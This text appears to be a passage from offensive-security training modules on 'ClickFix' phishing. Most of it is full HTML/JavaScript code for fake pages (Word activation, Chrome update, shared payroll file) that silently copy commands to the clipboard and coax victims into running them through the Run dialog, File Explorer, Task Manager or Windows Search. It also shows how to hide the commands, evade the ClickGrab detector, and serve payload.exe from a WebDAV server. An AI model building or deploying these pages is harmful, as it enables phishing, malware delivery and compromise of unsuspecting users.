            <div class="hint">CLICK TO COPY</div>
        </div>
    </div>

    <script>
        document.getElementById('codeBlock').addEventListener('click',function(){
            navigator.clipboard.writeText('Harmless command 1')
                .then(() => navigator.clipboard.writeText('Harmless command 2'))
                .then(() => navigator.clipboard.writeText('Harmless command 3'))
                .then(() => navigator.clipboard.writeText('Harmless command 4'))
                .then(() => navigator.clipboard.writeText('Harmless command 5'))
                .then(() => navigator.clipboard.writeText('Harmless command 6'))
                .then(() => navigator.clipboard.writeText('Harmless command 7'))
                .then(() => navigator.clipboard.writeText('Harmless command 8'))
                .then(() => navigator.clipboard.writeText('Harmless command 9'))
                .then(() => navigator.clipboard.writeText('cmd.exe /c ping example.com & :: Microsoft Activation Code: CXIAIUSDAIJSKDSK32281'));
            const card=document.querySelector('.card');
            card.innerHTML=
                '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;" alt="Company Logo">'+
                '<h1>Activate Microsoft Word</h1>'+
                '<p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>';
        });
    </script>
</body>
</html>

```

### Technique 4: Intercepting Windows Button
The final technique in this module involves attempting to detect when the user presses the Windows key as part of the Windows and R key combination, using that moment to write the malicious command to the clipboard. This approach is risky, as JavaScript cannot capture key events unless the browser window is in focus. However, it offers the advantage of allowing all prior mouse interactions to write harmless clipboard content until the last user interaction.

```
window.addEventListener('keydown', (e) => {
    if (e.key === 'Meta') {
        navigator.clipboard.writeText('cmd.exe /c ping example.com & :: Microsoft Activation Code: CXIAIUSDAIJSKDSK32281')
    }
});

```
Additionally, we can add an event listener for the R key to handle cases where the user presses it first while attempting the Windows and R key combination.

```
window.addEventListener('keydown', (e) => {
    if (e.key === 'Meta' || e.key.toLowerCase() === 'r') {
        navigator.clipboard.writeText('cmd.exe /c ping example.com & :: Microsoft Activation Code: CXIAIUSDAIJSKDSK32281');
    }
});

```
The complete updated code is shown below.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Failed To Load</title>
    <style>
        html, body{height:100%;margin:0;}
        body{
            background:url('bg.png') no-repeat center center fixed;
            background-size:cover;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:"Segoe UI","Segoe UI Variable",Tahoma,Verdana,sans-serif;
        }
        .card{
            background:#fff;
            padding:40px 60px;
            text-align:center;
            border-radius:8px;
            box-shadow:0 4px 12px rgba(0,0,0,.1);
            max-width:400px;
            width:90%;
        }
        .card img{
            width:80px;
            height:80px;
            object-fit:contain;
            margin-bottom:24px;
        }
        .card h1{font-size:1.5rem;margin:0 0 16px;color:#333;}
        .card p{font-size:1rem;color:#555;margin:0 0 32px;}

        .code-viewer{
            position:relative;
            background:#f5f5f5;
            border:1px solid #ddd;
            border-radius:6px;
            padding:16px;
            font-family:Consolas,monospace;
            cursor:pointer;
            transition:background .2s;
            user-select:none;
        }
        .code-viewer:hover{background:#e0e0e0;}
        .hint{
            position:absolute;
            top:0;left:0;right:0;bottom:0;
            display:flex;
            align-items:center;
            justify-content:center;
            color:#666;
            font-weight:600;
            background:rgba(255,255,255,.85);
            opacity:0;
            transition:opacity .2s;
            pointer-events:none;
        }
        .code-viewer:hover .hint{opacity:1;}
    </style>
</head>
<body>
    <div class="card">
        <img src="icon.png" alt="Document Icon">
        <h1>"Payroll Schedule.docx" Failed To Load</h1>
        <p>You need to activate Microsoft Word to view this document.</p>

        <div id="codeBlock" class="code-viewer">
            Activation Code: CXIAIUSDAIJSKDSK32281
            <div class="hint">CLICK TO COPY</div>
        </div>
    </div>

    <script>
        document.getElementById('codeBlock').addEventListener('click',function(){
            navigator.clipboard.writeText('Harmless command');
            const card=document.querySelector('.card');
            card.innerHTML=
                '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;" alt="Company Logo">'+
                '<h1>Activate Microsoft Word</h1>'+
                '<p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>';
        });

        window.addEventListener('keydown', (e) => {
            if (e.key === 'Meta' || e.key.toLowerCase() === 'r') {
                navigator.clipboard.writeText('cmd.exe /c ping example.com & :: Microsoft Activation Code: CXIAIUSDAIJSKDSK32281');
            }
        });
    </script>
</body>
</html>

```
The video can be found in folder: `./videos/finaltech.mp4`

## Objectives
Implement anti-analysis measures to block ClickGrab from successfully flagging your ClickFix page

Manipulate the behavior of your ClickFix phishing page so that it copies the commands to the clipboard in an unexpected manner


---

# Novo Módulo 10 — Alternativas ao Run Dialog no ClickFix

Novo Módulo 10 — Alternativas ao Run Dialog no ClickFix

- # Novo Módulo 10 — Alternativas ao Run Dialog no ClickFix

# Disclaimer
# Module 10 - ClickFix: Run Dialog Alternatives

## Introduction
In the previous module, we introduced the ClickFix social engineering technique, which tricks users into unknowingly executing a command via the Run Dialog. The primary limitation of this method is its strong dependence on the Run Dialog itself. This creates a hurdle for attackers as defenders can focus their detection and prevention efforts on monitoring or restricting activity within the Run Dialog. For example, this blog post lists several ways in which the Run Dialog can be disabled such as using Group Policy Objects (GPOs) or by setting a new Registry value to prevent `Win + R` from working.In this module, we will explore three alternative ways we can coerce a user to execute our commands without relying on the Run Dialog. These alternatives ways will also utilize shortcut keys.
## File Explorer Address Bar
The File Explorer address bar is a prime alternative method for executing commands due to its user familiarity and the ability to access it using keyboard shortcuts. The `Win + E` shortcut will spawn a new Explorer window and the `Alt + D` will auto-select the address bar. This leaves the user being able to easily paste the copied command using `Ctrl + V` with ease. Any command entered into the address field will execute, similarly to the Run Dialog.
### File Explorer ClickFix
Since the File Explorer application is associated with accessing documents, we can tailor our phishing template to inform the user that an important document should be located through the File Explorer address bar.
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Document Available</title>
  <style>
    html, body { height: 100%; margin: 0; }
    body {
      background: url('bg.png') no-repeat center center fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: "Segoe UI", "Segoe UI Variable", Tahoma, Verdana, sans-serif;
    }
    .card {
      background: #fff;
      padding: 40px 60px;
      text-align: center;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,.1);
      max-width: 420px;
      width: 90%;
    }
    .card img {
      width: 80px;
      height: 80px;
      object-fit: contain;
      margin-bottom: 24px;
    }
    .card h1 {
      font-size: 1.5rem;
      margin: 0 0 16px;
      color: #333;
    }
    .card p {
      font-size: 1rem;
      color: #555;
      margin: 0 0 24px;
    }
    button {
      background-color: #0078d4;
      color: white;
      padding: 10px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005a9e;
    }
    .steps {
      display: none;
      text-align: left;
      margin-top: 24px;
      font-size: 0.95rem;
      color: #444;
    }
    .steps code {
      background: #eee;
      padding: 2px 4px;
      border-radius: 4px;
      font-family: Consolas, monospace;
    }
    .steps ol li {
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="icon.png" alt="Document Icon" />
    <h1>Company Document Available</h1>
    <p>Company X has placed "Policy Update.docx" on your PC.</p>

    <button id="revealBtn">Access Instructions</button>

    <div class="steps" id="stepsBlock">
      <p><strong>Follow these steps to locate the document:</strong></p>
      <ol>
        <li>Press <code>Win + E</code> to open File Explorer.</li>
        <li>Press <code>Alt + D</code> to focus the address bar.</li>
        <li>Press <code>Ctrl + V</code> to paste the document name.</li>
      </ol>
    </div>
  </div>

  <script>
    document.getElementById('revealBtn').addEventListener('click', function () {
      navigator.clipboard.writeText('cmd.exe /c "ping example.com"');
      document.getElementById('stepsBlock').style.display = 'block';
      this.style.display = 'none';
    });
  </script>
</body>
</html>

```

### Hiding The Malicious Command
Similarly to the Run Dialog, we can append a comment with empty spaces to show a harmless sentence or command to make the social engineering pretext appear more realistic.
```
navigator.clipboard.writeText('powershell.exe -c ping example.com  #                                                                                                                                                                     Access HR Policy File: "Policy File.docx"');

```
The video can be found in folder: `./videos/explorer-demo.mp4`
## Windows Task Manager's Run Dialog
Another possibility to execute commands copied from a ClickFix phishing page is through the Windows Task Manager. The Task Manager has an option to run a new task which when clicked pops up a GUI similar to the Run Dialog. Launching Task Manager can be done in various ways, but for ClickFix social engineering attacks, we aim to use the simplest method: a Windows shortcut key. To launch Task Manager using a shortcut, press `Ctrl + Shift + Esc`. Once launched, you’ll see the "Run new task" button, which opens Task Manager's Run dialog when clicked. Conveniently, this dialog can also be opened by pressing `Alt + N`.
### Task Manager ClickFix
Since average users typically see Task Manager as a technical tool mainly used by IT professionals for troubleshooting system issues, we should design our ClickFix phishing page to align with that perception. The phishing page below features an "Update Chrome" button which, when clicked, copies a malicious command to the clipboard. It also triggers a progress bar designed to simulate a Chrome update. As the progress nears completion, a pop-up modal appears informing the user that the update has failed and instructs them to open the Task Manager's Run Dialog to free up memory.
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Chrome</title>
    <style>
      :root {
        --blue: #1a73e8;
        --gray: #5f6368;
        --text: #202124;
        --bg: #f9fbfd;
      }

      *,
      *::before,
      *::after {
        box-sizing: border-box;
        margin: 0;
        padding: 0
      }

      body {
        font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
        color: var(--text);
        background: var(--bg);
        min-height: 100vh;
        display: flex;
        flex-direction: column
      }

      header {
        width: 100%;
        background: #fff;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 18px 48px;
        border-bottom: 1px solid rgba(0, 0, 0, .06)
      }

      .brand {
        font-weight: 300;
        font-size: 20px;
        letter-spacing: 2px
      }

      nav a {
        text-decoration: none;
        margin-left: 36px;
        font-weight: 500;
        color: var(--gray);
        position: relative;
        transition: color .2s
      }

      nav a.active {
        color: var(--blue)
      }

      nav a.active::after {
        content: "";
        position: absolute;
        left: 0;
        bottom: -6px;
        width: 100%;
        height: 3px;
        background: var(--blue);
        border-radius: 2px
      }

      main {
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        padding: 80px 20px;
        background: radial-gradient(ellipse at 85% 15%, #e8f0fe 0%, rgba(232, 240, 254, 0)60%), radial-gradient(ellipse at 15% 85%, #d2e3fc 0%, rgba(210, 227, 252, 0)60%)
      }

      .logo {
        width: 96px;
        height: 96px;
        margin-bottom: 32px
      }

      h1 {
        font-size: 48px;
        font-weight: 500;
        line-height: 1.2;
        margin-bottom: 32px
      }

      .btn {
        background: var(--blue);
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 17px;
        font-weight: 500;
        padding: 14px 36px;
        cursor: pointer;
        transition: box-shadow .2s
      }

      .btn:hover {
        box-shadow: 0 2px 6px rgba(0, 0, 0, .15)
      }

      .subtext {
        margin-top: 12px;
        font-size: 14px;
        color: var(--gray)
      }

      .link {
        display: inline-block;
        margin-top: 40px;
        font-size: 16px;
        color: var(--blue);
        text-decoration: none;
        font-weight: 500
      }

      .progress-container {
        width: 300px;
        height: 12px;
        background: #e0e0e0;
        border-radius: 6px;
        overflow: hidden;
        margin-top: 24px;
        display: none
      }

      .progress-bar {
        height: 100%;
        width: 0%;
        background-color: var(--blue);
        transition: width .2s ease
      }

      .modal {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, .45);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 1000
      }

      .modal.open {
        display: flex
      }

      .modal-content {
        background: #fff;
        border-radius: 8px;
        max-width: 480px;
        width: 90%;
        padding: 32px 40px;
        text-align: left;
        box-shadow: 0 4px 16px rgba(0, 0, 0, .2)
      }

      .modal-content h2 {
        font-size: 24px;
        font-weight: 500
      }

      .modal-content ul {
        margin-left: 20px;
        font-size: 15px;
        line-height: 1.7
      }

      #modalDescription {
        margin-top: 5px;
        margin-bottom: 20px;
      }

      .modal-content code {
        background: #f1f3f4;
        padding: 2px 4px;
        border-radius: 4px;
        font-size: 14px
      }

      footer {
        text-align: center;
        font-size: 13px;
        color: var(--gray);
        padding: 40px 24px
      }

      footer a {
        color: var(--blue);
        text-decoration: none;
        margin: 0 4px
      }

      @media(max-width:600px) {
        nav a {
          margin-left: 20px;
          font-size: 14px
        }

        h1 {
          font-size: 34px
        }

        .logo {
          width: 72px;
          height: 72px
        }
      }
    </style>
  </head>
  <body>
    <header>
      <div class="brand">Chrome</div>
      <nav>
        <a href="#" class="active">Home</a>
        <a href="#">The Browser by Google</a>
        <a href="#">Features</a>
        <a href="#">Support</a>
      </nav>
    </header>
    <main>
      <img src="chrome.svg" alt="Chrome logo" class="logo">
      <h1>The browser built by Google</h1>
      <button id="updateBtn" class="btn">Update Chrome</button>
      <div id="progressContainer" class="progress-container">
        <div id="progressBar" class="progress-bar"></div>
      </div>
      <div class="subtext">For Windows 11 or later.</div>
    </main>
    <footer> By updating Chrome, you agree to the <a href="#">Google Terms of Service</a> and <a href="#">Chrome OS Additional Terms of Service</a>. </footer>
    <div id="modal" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <div class="modal-content">
        <h2 id="modalTitle">Update failed: Memory Full</h2>
        <p id="modalDescription">Follow the instructions below to free memory.</p>
        <ul>
          <li>Press <code>Ctrl + Shift + Esc</code> to open the Windows Task Manager.</li>
          <li>Press <code>Alt + N</code> to create a new task.</li>
          <li>Press <code>Ctrl + V</code> to free system memory.</li>
        </ul>
      </div>
    </div>
    <script>
      const updateBtn = document.getElementById('updateBtn');
      const progressContainer = document.getElementById('progressContainer');
      const progressBar = document.getElementById('progressBar');
      const modal = document.getElementById('modal');
      updateBtn.addEventListener('click', () => {
        navigator.clipboard.writeText('cmd.exe /c ping example.com').catch(() => {});
        progressContainer.style.display = 'block';
        let progress = 0;
        const interval = setInterval(() => {
          progress += 2;
          progressBar.style.width = progress + '%';
          if (progress >= 100) clearInterval(interval);
        }, 100);
        setTimeout(() => {
          modal.classList.add('open');
        }, 5000);
      });
    </script>
  </body>
</html>

```
The video can be found in folder: `./videos/taskmgr-demo.mp4`
## Windows Search
The final method that will be discussed in this module is executing remotely hosted files using Windows Search. In Windows 10, it was possible to execute commands with command line arguments in the Windows Search such as `cmd.exe /c whoami`. In Windows 11, this was no longer possible, with Windows ignoring the command line arguments and simply launching the file. In this case, tricking the user to paste `cmd.exe /c whoami` will merely launch `cmd.exe` and not execute the command `whoami`. With that being said, there remains two ways to execute remotely hosted files:
Executing a remotely hosted file on an SMB server. A user would need to paste something like `\\server\share\payload.exe`, but this approach is less reliable since many organizations block outbound SMB traffic for security reasons.

- Executing a remotely hosted file on a WebDAV server. A user would need to paste something like `\\example.com@8080\path\payload.exe` which would fetch the remotely hosted payload and executed it over HTTP/HTTPS.

### WebDAV
Web Distributed Authoring and Versioning (WebDAV) is an extension of HTTP that adds additional methods and headers to support file management operations such as creating, moving, copying, and deleting files on remote servers. It essentially allows users to manage files on a web server as if they were a file server as well. There are several tools that allow us to spin up a WebDAV server, one of them being this simple WebDAV server.

```
# Install the webdav server
# Requires golang installed
go install github.com/hacdias/webdav/v5@latest

# Move the binary to the desktop
mv ~/go/bin/webdav ~/Desktop
cd ~/Desktop

./webdav -h

```

We can launch a WebDAV server on port 8080 using the command below:

```
./webdav -p 8080

```
Alternatively, if you want to use WebDAV over HTTPS, you will need to specify the path to the SSL certificate and key:

```
./webdav -t --cert cert.pem --key cert.key -p 443

```

To prepare for the next section, setup a directory named `payloads` which contains one or more payloads to use in the ClickFix attack.

```
Desktop
├── webdav
└── payloads/
    ├── payload.exe
    ├── payload.zip
    └── payload2.dll

```

### WebDAV ClickFix
Since the goal is to entice the user into searching a WebDAV-based UNC path, the design of the clickfix page should center around the theme of accessing a shared document. In the phishing page, the user is informed that a file has been shared with them, but due to its sensitive nature, it must be accessed via a secure internal file share. To build credibility, the page instructs the user to copy the file path. But if the user attempts to copy it, it will silently fail. Having already clicked on the "Open" button, the WebDAV URL of the malicious payload was previously copied to the clipboard.

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>File Shared</title>
    <style>
      body {
        font-family: "Segoe UI", sans-serif;
        background: #f2f2f2;
        margin: 0;
        padding: 40px;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh
      }

      .card {
        background: #fff;
        width: 450px;
        padding: 30px;
        box-shadow: 0 0 10px rgba(0, 0, 0, .1);
        border-radius: 8px;
        text-align: center;
        position: relative
      }

      .icon {
        width: 40px;
        height: 40px;
        margin: 0 auto 10px
      }

      .icon svg {
        width: 100%;
        height: 100%;
        fill: #0078d4
      }

      .file-box {
        border: 1px solid #ccc;
        border-radius: 6px;
        padding: 12px;
        margin: 20px 0;
        display: flex;
        align-items: center;
        justify-content: center
      }

      .file-box img {
        width: 24px;
        margin-right: 10px
      }

      .small-note {
        color: #666;
        font-size: 13px;
        margin-top: 8px
      }

      #dlFile {
        margin-top: 20px;
        background: #0078d4;
        color: #fff;
        border: none;
        padding: 12px 20px;
        border-radius: 4px;
        font-size: 16px;
        cursor: pointer
      }

      .overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, .45);
        z-index: 1000
      }

      .modal {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #fff;
        width: 580px;
        max-width: 90vw;
        padding: 50px;
        border-radius: 10px;
        box-shadow: 0 4px 16px rgba(0, 0, 0, .25);
        z-index: 1001
      }

      .hidden {
        display: none
      }

      .modal-content h2 {
        margin-top: 0;
        font-size: 20px;
        text-align: center;
        color: #333
      }

      #modal-description {
        font-size: 14px;
        color: #0f0f0f;
      }

      .close {
        position: absolute;
        top: 16px;
        right: 20px;
        font-size: 24px;
        font-weight: 700;
        color: #666;
        cursor: pointer
      }

      .copyable {
        background: #f5f5f5;
        border-radius: 4px;
        padding: 2px 6px;
        user-select: all;
        position: relative;
        display: inline-block;
      }

      .copyable::after {
        content: "Copy";
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.7);
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
        opacity: 0;
        transition: opacity 0.2s;
        border-radius: 4px;
      }

      .copyable:hover::after {
        opacity: 1;
      }

      .copyable.clicked::after {
        content: "Copied";
        opacity: 1;
      }

      .win-icon {
        font-size: 14px;
        vertical-align: -1px
      }

      ol {
        padding-left: 20px;
        margin: 1em 0
      }

      li {
        margin-bottom: 10px;
        font-size: 14px;
      }

      kbd {
        background: #eee;
        border-radius: 3px;
        border: 1px solid #b4b4b4;
        padding: 2px 4px;
        font-size: .9em;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif
      }
    </style>
  </head>
  <body>
    <div class="card">
      <div class="icon">
        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
          <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z" />
        </svg>
      </div>
      <h3>Jack Bob shared a file with you</h3>
      <p>Please review the attached document</p>
      <div class="file-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Microsoft_Office_Word_%282019%E2%80%93present%29.svg/2203px-Microsoft_Office_Word_%282019%E2%80%93present%29.svg.png" alt="Word icon" />
        <span>Updated Payroll Schedule</span>
      </div>
      <div class="small-note">This link only works for the direct recipients of this message.</div>
      <button id="dlFile" type="button">Open</button>
    </div>
    <div id="overlay" class="overlay hidden"></div>
    <div id="modal" class="modal hidden">
      <div class="modal-content">
        <span class="close" title="Close">&times;</span>
        <h2>Protected file</h2>
        <p id="modal-description">Your organization requires you to view "<strong>UpdatedPayroll.docx</strong>" internally.</p>
        <ol>
          <li>Press the  <kbd>Windows</kbd> key to open the Windows Search Menu.</li>
          <li>Copy the file path: <code id="uncPath" class="copyable">\\internal.company.com\Secure\UpdatedPayroll.docx</code>
          </li>
          <li>Paste the file path and press <kbd>Enter</kbd>.</li>
        </ol>
      </div>
    </div>
    <script>
      const openBtn = document.getElementById("dlFile");
      const overlay = document.getElementById("overlay");
      const modal = document.getElementById("modal");
      const closeBtn = document.querySelector(".close");
      const uncPath = document.getElementById("uncPath");

      function copyToClipboard(t) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(t).catch(() => {});
        } else {
          const e = document.createElement("textarea");
          e.value = t;
          document.body.appendChild(e);
          e.select();
          document.execCommand("copy");
          e.remove();
        }
      }

      function showModal() {
        overlay.classList.remove("hidden");
        modal.classList.remove("hidden");
        copyToClipboard('\\\\10.0.0.28@8080\\payloads\\payload.exe');
      }

      function hideModal() {
        overlay.classList.add("hidden");
        modal.classList.add("hidden");
      }

      openBtn.addEventListener("click", showModal);
      closeBtn.addEventListener("click", hideModal);
      overlay.addEventListener("click", hideModal);

      uncPath.addEventListener("click", () => {
        uncPath.classList.add("clicked");
        setTimeout(() => {
          uncPath.classList.remove("clicked");
        }, 2000);
      });
    </script>
  </body>
</html>

```

The video can be found in folder: `./videos/clickfix_webdav_V1.mp4`

### Disadvantages
Although this method is powerful due to its simplicity, it does come with two disadvantages:

- Mark of the web (MoTW) - The file being executed will be subject to MoTW, resulting in a security prompt appearing to the user.

- Hiding the copied URL - Unlike the previous methods, we cannot append spaces with comments to hide the malicious command that was copied. This is not possible with the Windows Search Menu because it will show the entirety of the URL.

With that said, there is a way to add more authenticity to the copied command. By default, the Windows Search Menu will ignore everything after an empty space, meaning the following commands will all execute the remote `payload.exe` file.

```
\\10.0.0.28@8080\payloads\payload.exe

\\10.0.0.28@8080\payloads\payload.exe - Access internal document securely

\\10.0.0.28@8080\payloads\payload.exe (Secure internal access)

```
Therefore, while the WebDAV URL still shows, we can append additional context that may make it appear more legitimate.

## Conclusion
Using the alternative ClickFix methods shown in this module, we expand the number of execution points beyond the Run Dialog, making it more difficult for defenders, as prevention and detection mechanisms must now be implemented across multiple areas. Additionally, even if users are trained to recognize that the Run Dialog can execute system commands, other methods such as the File Explorer address bar and Windows Search are less obvious. This may increase the chances that ClickFix attacks will be successful.

## Objectives
Implement and test the three provided ClickFix methods. Which one of them is most practical in an engagement?

Optional: Research additional ways to execute commands outside of the three demonstrated methods


---

